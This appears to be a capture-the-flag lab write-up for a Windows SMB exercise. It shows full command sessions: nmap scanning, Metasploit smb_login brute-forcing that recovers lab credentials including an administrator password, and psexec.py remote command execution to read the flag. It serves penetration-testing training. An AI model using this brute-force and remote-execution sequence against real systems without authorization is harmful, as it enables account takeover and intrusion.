---
up: "[[Exploiting Windows Vulnerabilities]]"
---

# 🧪 Windows SMB Server PSExec

## Overview

A Kali GUI machine and a target machine running a vulnerable SMB service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the SMB service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. You need to find valid credentials to access the SMB service and abuse the service with available SMB Metasploit exploitation modules.

**Objective:** Exploit the SMB service to get a meterpreter on the target and retrieve the flag!

Instructions:

- Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
- The IP address of the target machine is mentioned in the file “/root/Desktop/target”
- Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1
- Dictionaries to use:
	- /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

## Solution

```bash
nmap 10.2.18.60
Starting Nmap 7.70 ( https://nmap.org ) at 2024-03-25 22:03 IST
Nmap scan report for 10.2.18.60
Host is up (0.0035s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
```

```bash
nmap -sC -sV -p 445 10.2.18.60
Starting Nmap 7.70 ( https://nmap.org ) at 2024-03-25 22:03 IST
Nmap scan report for 10.2.18.60
Host is up (0.0025s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-25 22:04:04
|_  start_date: 2024-03-25 22:00:48

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds
```

smb scripts scan:

```bash
nmap -p 445 --script smb-protocols 10.2.18.60
Starting Nmap 7.70 ( https://nmap.org ) at 2024-03-25 22:09 IST
Nmap scan report for 10.2.18.60
Host is up (0.0023s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds
```

anonymous login:

```bash
smbmap -u guest -p "" -d . -H $TRG
[+] Finding open SMB ports....
[!] Authentication error on 10.2.18.60
[!] Authentication error on 10.2.18.60
```

```bash
msf5 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner


msf5 > use 0
msf5 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > setg RHOSTS 10.2.18.60
RHOSTS => 10.2.18.60
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FiLE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FiLE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/smb/smb_login) > run

[+] 10.2.18.60:445        - 10.2.18.60:445 - Success: '.\sysadmin:samantha'
[+] 10.2.18.60:445        - 10.2.18.60:445 - Success: '.\demo:victoria'
[+] 10.2.18.60:445        - 10.2.18.60:445 - Success: '.\auditor:elizabeth'
[+] 10.2.18.60:445        - 10.2.18.60:445 - Success: '.\administrator:qwertyuiop' Administrator
[*] 10.2.18.60:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The `Administrator` account looks the most promising:

```bash
psexec.py administrator@10.2.18.60 cmd.exe
...
C:\Windows\system32> type C:\flag.txt
e0da81a9cd42b261bc9b90d15f780433
```
